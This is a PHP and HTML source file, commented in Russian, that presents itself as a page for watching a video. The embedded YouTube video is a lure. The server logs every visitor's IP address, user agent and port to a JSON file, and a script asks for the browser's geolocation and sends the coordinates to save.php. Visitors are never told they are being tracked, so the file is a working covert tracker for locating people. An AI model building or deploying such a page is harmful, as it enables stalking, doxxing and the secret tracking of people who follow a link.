<?php
// index.php
// 1. Сбор серверных конфигурационных данных и заголовков
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
$request_time = date('Y-m-d H:i:s');
$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
$port = $_SERVER['REMOTE_PORT'] ?? '';

// 2. Генерация случайного видео для демонстрации (массив тестовых ID)
$videos = ['dQw4w9WgXcQ', 'jNQXAC9IVRw', '9bZkp7q19f0'];
$random_video = $videos[array_rand($videos)];

// 3. Формирование базовой записи (без координат)
$log_entry = [
    'id' => uniqid(),
    'time' => $request_time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'protocol' => $protocol,
    'port' => $port,
    'lat' => 'Доступ отклонен или ожидается',
    'lon' => 'Доступ отклонен или ожидается'
];

// Сохраняем первичный лог в сессию, чтобы связать его с координатами из JS
session_start();
$_SESSION['current_log_id'] = $log_entry['id'];

// Записываем первичную структуру в файл logs.json
$file = 'logs.json';
$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($current_data)) $current_data = [];
$current_data[$log_entry['id']] = $log_entry;
file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Просмотр видеоматериала</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0e1217;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 800px;
            text-align: center;
        }
        .video-wrapper {
            position: relative;
            padding-bottom: 56.25%; /* Пропорции 16:9 для адаптивности */
            height: 0;
            overflow: hidden;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            background: #000;
        }
        .video-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }
        h2 { font-weight: 400; margin-bottom: 20px; color: #a0aec0; }
    </style>
</head>
<body>

<div class="container">
    <h2>Тестовый плеер (Анализ сетевой доступности)</h2>
    <div class="video-wrapper">
        <iframe 
            src="https://www.youtube.com/embed/<?php echo $random_video; ?>" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
            allowfullscreen>
        </iframe>
    </div>
</div>

<script>
// Запрос геокоординат через легитимный Браузерный API
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        // Формируем данные для отправки
        const data = new FormData();
        data.append('lat', position.coords.latitude);
        data.append('lon', position.coords.longitude);

        // Отправляем асинхронный запрос на сервер
        fetch('save.php', {
            method: 'POST',
            body: data
        });
    }, function(error) {
        console.log("Доступ к геопозиции не предоставлен пользователем.");
    });
}
</script>
</body>
</html>
